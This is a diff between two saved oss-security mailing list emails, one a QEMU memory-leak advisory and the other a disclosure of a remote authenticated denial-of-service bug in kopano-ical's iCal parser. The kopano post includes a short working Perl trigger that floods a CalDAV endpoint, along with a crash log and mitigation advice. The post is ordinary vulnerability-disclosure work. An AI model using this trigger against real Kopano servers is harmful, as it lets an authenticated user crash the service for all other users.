@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["698" "Tuesday" "6" "June" "2017" "17:40:00" "+0530" "P J P" "ppandit@redhat.com" "<alpine.LFD.2.20.1706061738020.10792@wniryva>" "23" "[oss-security] CVE-2017-9374 Qemu: usb: ehci host memory leakage during hotunplug" nil nil nil "6" "2017060612:10:00" "[oss-security] CVE-2017-9374 Qemu: usb: ehci host memory leakage during hotunplug" (number mark "U       ppandit@redh Jun  6   23/698   " thread-indent "\"[oss-security] CVE-2017-9374 Qemu: usb: ehci host memory leakage during hotunplug\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2359" "Friday" "13" "August" "2021" "14:21:03" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "65" "[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception" nil nil nil "8" nil nil (number mark "U       jengelh@inai Aug 13   65/2359  " thread-indent "\"[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled exception" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11314 invoked by uid 550); 6 Jun 2017 12:10:18 -0000
+Received: (qmail 25955 invoked by uid 550); 14 Aug 2021 08:32:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,43 +12,79 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11269 invoked from network); 6 Jun 2017 12:10:17 -0000
-DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com DCFEBC04B31B
-Authentication-Results: ext-mx07.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
-Authentication-Results: ext-mx07.extmail.prod.ext.phx2.redhat.com; spf=pass smtp.mailfrom=ppandit@redhat.com
-DKIM-Filter: OpenDKIM Filter v2.11.0 mx1.redhat.com DCFEBC04B31B
-Date: Tue, 6 Jun 2017 17:40:00 +0530 (IST)
-From: P J P <ppandit@redhat.com>
-X-X-Sender: pjp@javelin
-To: oss security list <oss-security@lists.openwall.com>
-cc: Li Qiang <liqiang6-s@360.cn>
-Message-ID: <alpine.LFD.2.20.1706061738020.10792@wniryva>
+Received: (qmail 11662 invoked from network); 13 Aug 2021 12:21:14 -0000
+Date: Fri, 13 Aug 2021 14:21:03 +0200 (CEST)
+From: Jan Engelhardt <jengelh@inai.de>
+To: oss-security@lists.openwall.com
+Message-ID: <667r8r55-1p9r-9n56-p26s-31q32674814@vanv.qr>
+User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
 MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-X-Scanned-By: MIMEDefang 2.79 on 10.5.11.13
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.31]); Tue, 06 Jun 2017 12:10:05 +0000 (UTC)
-Subject: [oss-security] CVE-2017-9374 Qemu: usb: ehci host memory leakage during hotunplug
+Content-Type: text/plain; charset=US-ASCII
+Subject: [oss-security] kopano-core 11.0.2.43: Remote authenticated DoS with unhandled
+ exception
 
-   Hello,
 
-Quick Emulator(Qemu) built with the USB EHCI Emulation support is vulnerable 
-to a memory leakage issue. It could occur while hot-unplugging the device, as 
-it does not release the memory allocated at initialisation.
+To the best of my knowledge, this is the initial publication,
+and there is no CVE number as of this time.
 
-A guest user/process could use this issue to leak host memory, resulting in 
-DoS for host.
 
-Upstream patch:
----------------
-   -> http://git.qemu.org/?p=qemu.git;a=commit;h=d710e1e7bd3d5bfc26b631f02ae87901ebe646b0
+== Affected versions ==
 
-Reference:
-----------
-   -> https://bugzilla.redhat.com/show_bug.cgi?id=1459132
+  * kopano-core 11.0.2.43 and presumably all prior versions
 
-This issue was reported by Li Qiang of Qihoo 360 Gear Team.
 
-Thank you.
---
-Prasad J Pandit / Red Hat Product Security Team
-47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
+== Issue ==
+
+The ical parser in kopano-ical's "iCal::HrHandleIcalPost" function is
+very memory hungry. With the testcase below, I observe that the
+function makes the process image grow to as much memory as 30x the
+size of the HTTP request it is processing. A suitably-chosen input
+can be used to push the process over the limits of the environment.
+An authenticated user is required to perform the operation, however.
+
+If those conditions are met, std::bad_alloc can escape and, since this 
+exception is unhandled, terminates the program, depriving other users of 
+the service.
+
+# ulimit -v 4000000
+# ./kopano-ical -F &
+01:04:40.029434: kopano-ical 11.0.1
+01:04:40.029481: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
+01:04:40.029488: Thread name: kopano-ical
+01:04:40.029510: Peak RSS: 3911832
+01:04:40.029528: Pid 14984 caught SIGSEGV (11), traceback:
+01:04:40.029535: Backtrace:
+terminate called after throwing an instance of 'std::bad_alloc'
+  what():  std::bad_alloc
+01:04:40.030456: ----------------------------------------------------------------------
+01:04:40.030464: Fatal error detected. Please report all following information.
+01:04:40.030471: kopano-ical 11.0.1
+01:04:40.030477: OS: openSUSE Tumbleweed (Linux 5.13.7 x86_64)
+01:04:40.030482: Thread name: kopano-ical
+01:04:40.030489: Peak RSS: 3911832
+01:04:40.030494: Pid 14984 caught SIGABRT (6), out of memory or unhandled exception, traceback:
+01:04:40.030499: Backtrace:
+terminate called recursively
+Aborted (core dumped)
+
+
+== Trigger ==
+
+#!/usr/bin/perl
+use IO::Socket::INET;
+$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,8000);
+$rep = $ARGV[0] || 500; # max 19522
+$size = $rep *11*10000+28;
+$s->write("POST /caldav/ HTTP/1.0\nAuthorization: Basic Zm9vOmZvbw==\nContent-Length: $size\n\n");
+$s->write("BEGIN:VCALENDER\nVERSION:2.0\n");
+$a = "SUMMARY: A\n" x 10000;
+$s->write($a) for 1..$rep;
+
+
+== Mitigation ==
+
+An administrator could install an additional proxy/loadbalancer/etc.
+and there set a limit on the HTTP request size. (kopano-ical has
+nothing of its own.) However, such administrative action equally
+implies a reduction of the service's capabilities offered to
+end-users.
